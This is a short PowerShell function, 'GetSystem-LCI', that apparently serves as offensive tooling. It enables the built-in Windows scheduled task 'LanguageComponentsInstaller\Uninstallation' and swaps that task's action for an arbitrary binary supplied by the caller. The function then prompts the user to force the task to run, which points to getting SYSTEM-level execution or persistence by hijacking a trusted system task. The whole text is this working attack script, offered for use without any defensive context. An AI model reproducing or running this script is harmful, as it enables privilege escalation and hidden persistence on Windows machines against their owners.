function GetSystem-LCI {
    param (
        [string]$BinaryPath # Path of the binary to execute
    )

    # Define the name and path of the task
    $TaskName = "Uninstallation"
    $TaskPath = "\Microsoft\Windows\LanguageComponentsInstaller"

    try {
        # Check if the task exists
        $task = Get-ScheduledTaskInfo -TaskPath $TaskPath -TaskName $TaskName
        if ($null -ne $task) {
            Write-Output "The task '$TaskPath\$TaskName' exists. Modifying the action..."

            # Enable the scheduled task
            Enable-ScheduledTask -TaskPath $TaskPath -TaskName $TaskName
            Write-Output "The task has been activated."

            # Create a new action
            $payload = New-ScheduledTaskAction -Execute $BinaryPath

            # Update the task with the new action
            Set-ScheduledTask -TaskPath $TaskPath -TaskName $TaskName -Action $payload
            Write-Output "The task action has been updated to execute '$BinaryPath'."

            Write-Output "You can now force the task execution."
        } else {
            Write-Error "The task '$TaskPath\$TaskName' does not exist."
        }
    } catch {
        Write-Error "Error while checking or modifying the task: $_"
    }
}
